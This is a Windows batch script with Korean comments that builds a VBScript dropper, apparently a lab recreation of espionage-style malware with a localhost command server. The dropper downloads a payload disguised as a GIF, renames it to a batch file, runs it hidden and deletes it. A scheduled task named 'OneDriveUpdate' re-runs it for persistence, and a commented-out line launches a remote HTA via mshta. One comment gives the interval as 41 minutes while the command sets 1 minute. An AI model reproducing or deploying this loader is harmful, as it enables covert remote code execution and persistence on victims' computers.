@echo off
REM 콘솔 창 크기 설정
mode 15,1

REM 지정된 URL을 인터넷 익스플로러로 엽니다
REM start explorer "http://localhost:8000"

REM VBScript 파일을 TEMP 디렉토리에 생성하여 작성합니다
echo On Error Resume Next > "%temp%\warm.vbs"
echo Set ws = CreateObject("WScript.Shell") >> "%temp%\warm.vbs"
echo Set fs = CreateObject("Scripting.FileSystemObject") >> "%temp%\warm.vbs"
echo Set Post0 = CreateObject("msxml2.xmlhttp") >> "%temp%\warm.vbs"
echo gpath = ws.ExpandEnvironmentStrings("%%appdata%%\Microsoft\cool.gif") >> "%temp%\warm.vbs"
echo bpath = ws.ExpandEnvironmentStrings("%%appdata%%\Microsoft\cool.bat") >> "%temp%\warm.vbs"
echo If fs.FileExists(gpath) Then >> "%temp%\warm.vbs"
echo     re = fs.MoveFile(gpath, bpath)  ' cool.gif 파일을 cool.bat 파일로 이동합니다 >> "%temp%\warm.vbs"
echo     re = ws.Run(bpath, 0, True)  ' cool.bat 파일을 실행합니다 (0: 숨김 모드, True: 동기식 실행) >> "%temp%\warm.vbs"
echo     fs.DeleteFile(bpath)  ' 실행 후 cool.bat 파일을 삭제합니다 >> "%temp%\warm.vbs"
echo Else >> "%temp%\warm.vbs"
echo     Post0.Open "GET", "http://localhost:8000/d.php?na=battmp", False >> "%temp%\warm.vbs"
echo     Post0.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> "%temp%\warm.vbs"
echo     Post0.Send >> "%temp%\warm.vbs"
echo     t0 = Post0.ResponseText >> "%temp%\warm.vbs"
echo     Set f = fs.CreateTextFile(gpath, True) >> "%temp%\warm.vbs"
echo     f.Write(t0) >> "%temp%\warm.vbs"
echo     f.Close >> "%temp%\warm.vbs"
echo End If >> "%temp%\warm.vbs"

REM 스케줄 작업을 생성하여 41분마다 warm.vbs를 실행합니다
schtasks /create /tn OneDriveUpdate /tr "wscript.exe /b "%TEMP%\warm.vbs"" /sc minute /mo 1 /f

REM 최소화된 상태로 mshta를 사용하여 지정된 URL을 엽니다
REM start /min mshta http://localhost:8000/ttt.hta
